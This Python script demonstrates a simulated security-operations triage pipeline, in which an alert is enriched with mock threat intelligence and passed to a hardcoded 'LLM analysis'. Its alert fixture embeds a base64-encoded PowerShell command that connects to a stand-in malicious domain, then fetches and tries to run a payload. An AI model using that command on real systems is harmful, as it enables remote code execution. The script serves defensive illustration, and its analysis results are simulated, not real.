#!/usr/bin/env python3
"""
Real-World Case Study: TAA Agent LLM Analysis
=============================================

This demonstrates how the TAA agent processes a realistic security alert
using LLM analysis in a production SOC environment.

Case: Suspicious PowerShell Execution with Network Connection
"""

import json
import logging
from datetime import datetime, timedelta
from typing import Dict, Any

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

class RealWorldTAACase:
    """Real-world case study for TAA agent LLM analysis"""
    
    def __init__(self):
        self.case_id = "CASE-2024-001"
        self.alert_data = self._create_realistic_alert()
        
    def _create_realistic_alert(self) -> Dict[str, Any]:
        """Create a realistic security alert based on common attack patterns"""
        
        return {
            "alert_id": "ALERT-2024-07-13-001",
            "timestamp": "2024-07-13T14:30:25Z",
            "source": "EDR_Sensor_001",
            "severity": "medium",
            "category": "suspicious_activity",
            "log_data": {
                "event_type": "process_creation",
                "process_name": "powershell.exe",
                "process_id": 12345,
                "parent_process": "explorer.exe",
                "command_line": "powershell.exe -EncodedCommand JABwID0gTmV3LU9iamVjdCBOZXQuU29ja2V0cy5UQ1BDbGllbnQoInN1c3BpY2lvdXMtZG9tYWluLmNvbSIsIDQ0Myk7JABzID0gJHAuR2V0U3RyZWFtKCk7JGIgPSBOZXctT2JqZWN0IGJ5dGVbNjU1MzVdOyRzLlJlYWQoJGIsIDAsLCRiLkxlbmd0aCk7JGV2ID0gW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRTdHJpbmcoJGIsIDAsLCRiLkxlbmd0aCk7JGV4ID0gW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRTdHJpbmcoW0NvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKCRldikpOyRleCgp",
                "user": "CORP\\john.doe",
                "hostname": "WORKSTATION-001",
                "src_ip": "192.168.1.100",
                "dst_ip": "185.220.101.45",
                "dst_port": 443,
                "domain": "suspicious-domain.com",
                "file_hash": "a1b2c3d4e5f6789012345678901234567890abcd",
                "file_path": "C:\\Users\\john.doe\\Downloads\\suspicious_script.ps1"
            },
            "indicators": [
                "suspicious_powershell_execution",
                "encoded_command",
                "network_connection",
                "base64_encoded_payload"
            ],
            "metadata": {
                "detection_rule": "Suspicious PowerShell with Network Activity",
                "rule_id": "PS-001",
                "confidence_score": 0.75
            }
        }
    
    def _enrich_alert_with_threat_intelligence(self, alert: Dict) -> Dict:
        """Simulate threat intelligence enrichment"""
        
        enriched_data = {
            "src_ip_intel": {
                "reputation_score": 85,
                "is_malicious": False,
                "categories": ["corporate"],
                "country": "US",
                "asn": "AS12345",
                "last_reported": None
            },
            "dst_ip_intel": {
                "reputation_score": 15,
                "is_malicious": True,
                "categories": ["malware", "c2_server", "phishing"],
                "recent_reports": 45,
                "country": "RU",
                "asn": "AS12346",
                "last_reported": "2024-07-12T10:15:30Z"
            },
            "domain_intel": {
                "reputation_score": 10,
                "is_malicious": True,
                "categories": ["malware_distribution", "c2"],
                "last_analysis_date": "2024-07-12T08:30:00Z",
                "creation_date": "2024-01-15T12:00:00Z",
                "registrar": "Suspicious Registrar LLC"
            },
            "file_intel": {
                "reputation_score": 5,
                "is_malicious": True,
                "categories": ["trojan", "backdoor"],
                "detection_ratio": "45/70",
                "last_analysis_date": "2024-07-13T09:45:00Z"
            },
            "historical_context": {
                "previous_alerts": 3,
                "previous_incidents": 1,
                "first_seen": "2024-07-10T16:20:00Z",
                "last_seen": "2024-07-13T14:30:25Z",
                "recent_activity": [
                    "Similar PowerShell execution 2 days ago",
                    "Network connection to suspicious IP 1 day ago"
                ]
            }
        }
        
        return enriched_data
    
    def _create_llm_prompt(self, enriched_alert: Dict) -> str:
        """Create a detailed LLM prompt for analysis"""
        
        alert_summary = {
            "alert_id": enriched_alert["alert_id"],
            "event_type": enriched_alert["log_data"]["event_type"],
            "process": enriched_alert["log_data"]["process_name"],
            "command_line": enriched_alert["log_data"]["command_line"],
            "user": enriched_alert["log_data"]["user"],
            "hostname": enriched_alert["log_data"]["hostname"],
            "network_connection": {
                "src_ip": enriched_alert["log_data"]["src_ip"],
                "dst_ip": enriched_alert["log_data"]["dst_ip"],
                "dst_port": enriched_alert["log_data"]["dst_port"],
                "domain": enriched_alert["log_data"]["domain"]
            },
            "threat_intelligence": enriched_alert["enriched_data"],
            "indicators": enriched_alert["indicators"],
            "metadata": enriched_alert["metadata"]
        }
        
        prompt = f"""You are an expert cybersecurity analyst working in a Security Operations Center (SOC). 

Analyze the following security alert and determine if it represents a true positive (actual threat) or false positive (benign activity).

ALERT DETAILS:
{json.dumps(alert_summary, indent=2)}

KEY ANALYSIS POINTS TO CONSIDER:
1. The PowerShell command is base64 encoded - this is a common evasion technique
2. The destination IP (185.220.101.45) has a reputation score of 15/100 and is flagged as malicious
3. The domain "suspicious-domain.com" is associated with malware distribution and C2 activity
4. The file hash has a 45/70 detection ratio from antivirus engines
5. There's historical activity showing similar suspicious behavior from this host
6. The user (john.doe) is a regular employee, not an admin

RESPOND ONLY with a valid JSON object. Do not include any text, explanation, or markdown formatting before or after the JSON. The output must be a single valid JSON object matching this structure:

{{
  "is_true_positive": true/false,
  "severity": "high/medium/low",
  "confidence": 0.XX,
  "attack_type": "malware/phishing/brute_force/credential_theft/privilege_escalation/data_exfiltration/other",
  "indicators": ["indicator1", "indicator2", "indicator3"],
  "recommended_actions": ["action1", "action2", "action3"],
  "analysis_summary": "Detailed explanation of why this is a true/false positive and what type of attack this represents"
}}
"""
        return prompt
    
    def _simulate_llm_analysis(self, prompt: str) -> Dict:
        """Simulate LLM analysis response"""
        
        # This simulates what a real LLM would return for this case
        llm_response = {
            "is_true_positive": True,
            "severity": "high",
            "confidence": 0.92,
            "attack_type": "malware",
            "indicators": [
                "base64_encoded_powershell_command",
                "connection_to_malicious_ip",
                "suspicious_domain_resolution",
                "malicious_file_hash",
                "historical_suspicious_activity"
            ],
            "recommended_actions": [
                "Immediately isolate the affected host (WORKSTATION-001)",
                "Block outbound connections to 185.220.101.45",
                "Collect memory dump and disk image for forensic analysis",
                "Reset user credentials for john.doe",
                "Scan network for similar indicators of compromise",
                "Update firewall rules to block suspicious-domain.com"
            ],
            "analysis_summary": "This is a high-confidence true positive representing a malware infection. The base64-encoded PowerShell command is attempting to establish a reverse shell connection to a known malicious IP address (185.220.101.45) associated with C2 infrastructure. The destination domain is flagged for malware distribution, and the file hash has a high detection ratio. The historical context shows this is part of an ongoing attack campaign targeting the organization. The combination of encoded commands, malicious network connections, and threat intelligence indicators strongly suggests active malware attempting to establish command and control communication."
        }
        
        return llm_response
    
    def _make_final_decision(self, llm_analysis: Dict, enriched_data: Dict) -> Dict:
        """Combine LLM analysis with threat intelligence for final decision"""
        
        decision = llm_analysis.copy()
        
        # Enhance confidence based on threat intelligence
        ti_confidence_boost = 0.0
        
        # Check destination IP intelligence
        dst_ip_intel = enriched_data["dst_ip_intel"]
        if dst_ip_intel["is_malicious"]:
            ti_confidence_boost += 0.15
        
        # Check domain intelligence
        domain_intel = enriched_data["domain_intel"]
        if domain_intel["is_malicious"]:
            ti_confidence_boost += 0.10
        
        # Check file intelligence
        file_intel = enriched_data["file_intel"]
        if file_intel["is_malicious"]:
            ti_confidence_boost += 0.08
        
        # Check historical context
        historical = enriched_data["historical_context"]
        if historical["previous_incidents"] > 0:
            ti_confidence_boost += 0.05
        
        # Apply confidence boost
        decision["confidence"] = min(1.0, decision["confidence"] + ti_confidence_boost)
        
        # Adjust severity based on final confidence
        if decision["confidence"] >= 0.9:
            decision["severity"] = "high"
        elif decision["confidence"] >= 0.7:
            decision["severity"] = "medium"
        else:
            decision["severity"] = "low"
        
        decision["final_confidence"] = decision["confidence"]
        decision["ti_confidence_boost"] = ti_confidence_boost
        decision["timestamp"] = datetime.now().isoformat()
        
        return decision
    
    def run_case_study(self):
        """Run the complete case study"""
        
        logger.info(f"=== TAA Agent Real-World Case Study: {self.case_id} ===")
        logger.info(f"Alert ID: {self.alert_data['alert_id']}")
        logger.info(f"Event: {self.alert_data['log_data']['event_type']}")
        logger.info(f"Process: {self.alert_data['log_data']['process_name']}")
        logger.info(f"User: {self.alert_data['log_data']['user']}")
        logger.info(f"Host: {self.alert_data['log_data']['hostname']}")
        
        print("\n" + "="*80)
        print("STEP 1: ORIGINAL ALERT DATA")
        print("="*80)
        print(json.dumps(self.alert_data, indent=2))
        
        print("\n" + "="*80)
        print("STEP 2: THREAT INTELLIGENCE ENRICHMENT")
        print("="*80)
        enriched_data = self._enrich_alert_with_threat_intelligence(self.alert_data)
        self.alert_data["enriched_data"] = enriched_data
        print(json.dumps(enriched_data, indent=2))
        
        print("\n" + "="*80)
        print("STEP 3: LLM ANALYSIS PROMPT")
        print("="*80)
        llm_prompt = self._create_llm_prompt(self.alert_data)
        print(llm_prompt)
        
        print("\n" + "="*80)
        print("STEP 4: LLM ANALYSIS RESPONSE")
        print("="*80)
        llm_analysis = self._simulate_llm_analysis(llm_prompt)
        print(json.dumps(llm_analysis, indent=2))
        
        print("\n" + "="*80)
        print("STEP 5: FINAL DECISION (LLM + THREAT INTELLIGENCE)")
        print("="*80)
        final_decision = self._make_final_decision(llm_analysis, enriched_data)
        print(json.dumps(final_decision, indent=2))
        
        print("\n" + "="*80)
        print("STEP 6: RECOMMENDED ACTIONS")
        print("="*80)
        for i, action in enumerate(final_decision["recommended_actions"], 1):
            print(f"{i}. {action}")
        
        print("\n" + "="*80)
        print("CASE STUDY SUMMARY")
        print("="*80)
        print(f"Alert ID: {self.alert_data['alert_id']}")
        print(f"Decision: {'TRUE POSITIVE' if final_decision['is_true_positive'] else 'FALSE POSITIVE'}")
        print(f"Severity: {final_decision['severity'].upper()}")
        print(f"Confidence: {final_decision['final_confidence']:.2%}")
        print(f"Attack Type: {final_decision['attack_type']}")
        print(f"LLM Confidence: {llm_analysis['confidence']:.2%}")
        print(f"TI Confidence Boost: {final_decision['ti_confidence_boost']:.2%}")
        print(f"Total Indicators: {len(final_decision['indicators'])}")
        print(f"Recommended Actions: {len(final_decision['recommended_actions'])}")
        
        return {
            "alert_data": self.alert_data,
            "enriched_data": enriched_data,
            "llm_analysis": llm_analysis,
            "final_decision": final_decision
        }

def main():
    """Run the case study"""
    case = RealWorldTAACase()
    results = case.run_case_study()
    
    # Save results to file
    with open("taa_case_study_results.json", "w") as f:
        json.dump(results, f, indent=2, default=str)
    
    print(f"\nResults saved to: taa_case_study_results.json")

if __name__ == "__main__":
    main() 